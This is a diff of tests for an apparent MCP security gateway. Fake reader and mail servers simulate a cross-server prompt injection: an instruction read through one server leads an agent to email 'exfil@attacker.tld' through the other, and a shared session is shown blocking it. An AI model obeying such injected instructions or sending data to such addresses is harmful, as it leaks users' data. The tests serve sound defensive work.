@@ -299,3 +299,88 @@ def test_an_instruction_in_a_tool_description_is_untrusted_content(tmp_path):
     assert "audit-archive@vendor-support.example" in replies[3]["result"]["content"][0]["text"]
     assert replies[4]["result"]["content"][0]["text"] == "ok", "an ordinary recipient still passes"
     assert replies[5]["result"]["sent"] == [{"to": "colleague@northwind.example", "body": "hi"}]
+
+
+MAIL_SERVER = textwrap.dedent('''
+    import json, sys
+    TOOLS = [{"name": "send_email", "description": "Send an email.",
+              "inputSchema": {"type": "object", "properties": {"to": {"type": "string"}, "body": {"type": "string"}}}}]
+    SENT = []
+    for line in sys.stdin:
+        msg = json.loads(line)
+        m, i, p = msg.get("method"), msg.get("id"), msg.get("params") or {}
+        if m == "initialize":
+            out = {"protocolVersion": "2025-06-18", "capabilities": {"tools": {}}, "serverInfo": {"name": "mail", "version": "0"}}
+        elif m == "tools/list":
+            out = {"tools": TOOLS}
+        elif m == "tools/call":
+            SENT.append(p["arguments"]); out = {"content": [{"type": "text", "text": "sent"}]}
+        elif m == "server/sent":
+            out = {"sent": SENT}
+        else:
+            continue
+        sys.stdout.write(json.dumps({"jsonrpc": "2.0", "id": i, "result": out}) + "\\n"); sys.stdout.flush()
+''')
+
+
+def _two_gateways(tmp_path, session_file):
+    """One agent, two servers, one gateway process each, which is how a host runs them."""
+    reader = tmp_path / "reader.py"
+    reader.write_text(FAKE_SERVER)
+    mailer = tmp_path / "mailer.py"
+    mailer.write_text(MAIL_SERVER)
+    env = dict(os.environ, PYTHONPATH=os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+
+    def start(server_file):
+        cmd = [sys.executable, "-m", "reasongate.mcp", "--quiet"]
+        if session_file:
+            cmd += ["--session", str(session_file)]
+        cmd += ["--", sys.executable, str(server_file)]
+        return subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                                stderr=subprocess.PIPE, env=env)
+
+    return start(reader), start(mailer)
+
+
+def _talk(proc, msg):
+    proc.stdin.write((json.dumps(msg) + "\n").encode()); proc.stdin.flush()
+    if "id" in msg:
+        return json.loads(proc.stdout.readline())
+    return None
+
+
+def _cross_server_run(tmp_path, session_file):
+    a, b = _two_gateways(tmp_path, session_file)
+    try:
+        for p in (a, b):
+            _talk(p, {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}})
+            _talk(p, {"jsonrpc": "2.0", "id": 2, "method": "tools/list"})
+        # The instruction arrives through the first server.
+        _talk(a, {"jsonrpc": "2.0", "id": 3, "method": "tools/call",
+                  "params": {"name": "read_file", "arguments": {"path": "notes.txt"}}})
+        # The address it names is used through the second, which never saw the document.
+        reply = _talk(b, {"jsonrpc": "2.0", "id": 3, "method": "tools/call",
+                          "params": {"name": "send_email",
+                                     "arguments": {"to": "exfil@attacker.tld", "body": "here"}}})
+        sent = _talk(b, {"jsonrpc": "2.0", "id": 4, "method": "server/sent"})["result"]["sent"]
+    finally:
+        for p in (a, b):
+            p.stdin.close(); p.wait(timeout=30)
+    return reply, sent
+
+
+def test_without_a_shared_session_each_gateway_sees_only_its_own_server(tmp_path):
+    """The honest limit: a gateway wraps one process. Nobody runs a single MCP server, so
+    on its own it sees one half of what the agent read."""
+    reply, sent = _cross_server_run(tmp_path, session_file=None)
+    assert reply["result"].get("isError") is not True
+    assert sent == [{"to": "exfil@attacker.tld", "body": "here"}]
+
+
+def test_a_shared_session_joins_what_the_agent_read_across_servers(tmp_path):
+    """`--session FILE` in each server's config makes one agent run one context: the
+    document read through the first server taints the send made through the second."""
+    reply, sent = _cross_server_run(tmp_path, session_file=tmp_path / "session.jsonl")
+    assert reply["result"]["isError"] is True
+    assert "Blocked by ReasonGate" in reply["result"]["content"][0]["text"]
+    assert sent == [], "the mail server never saw the call"
